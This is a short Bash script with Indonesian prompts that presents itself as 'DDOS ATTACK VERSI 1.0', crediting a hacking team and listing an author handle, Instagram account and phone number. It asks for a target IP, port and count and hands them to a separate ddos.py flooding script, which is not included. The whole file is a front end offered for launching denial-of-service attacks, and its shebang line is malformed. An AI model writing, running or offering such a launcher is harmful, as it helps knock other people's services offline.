#usr/bin!/bash
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
hi='\033[0;30m' #Hitam
echo $bi"╔═══════════════════════════════════════╗"
echo $bi"║"$pu" Coder By"$ku"      :"$cy" Mr.!nSt4rneXt1"$bi"        ║"
echo $bi"║"$pu" Instagram"$ku"     :"$cy" @PangeranBotakArt_"$bi"    ║"
echo $bi"║"$pu" Whatsaap"$ku"      :"$cy" +6285692258584"$bi"        ║"
echo $bi"║"$pu" My Team"$ku"       :"$cy" CyberHackingIndonesia"$bi" ║"
echo $bi"╚═══════════════════════════════════════╝"
sleep 2
echo $bi"     ╔══════════════════════════╗"
echo $bi"     ║"$ku"   DDOS ATTACK VERSI 1.0"$bi"  ║"
echo $bi"     ║"$ku"  GUNAKAN DENGAN BIJAK!!!"$bi" ║"
echo $bi"     ╚══════════════════════════╝"
echo $pu""
read -p "[+]Masukan Ip Target: " i
read -p "[+]Masukan Port: " p
read -p "[+]Masukan Jumlah: " j
if [ $i = "$i" ] || [ $j = "$j" ] || [ $p = "$p" ];then
python2 ddos.py "$i" "$p" "$j"
fi
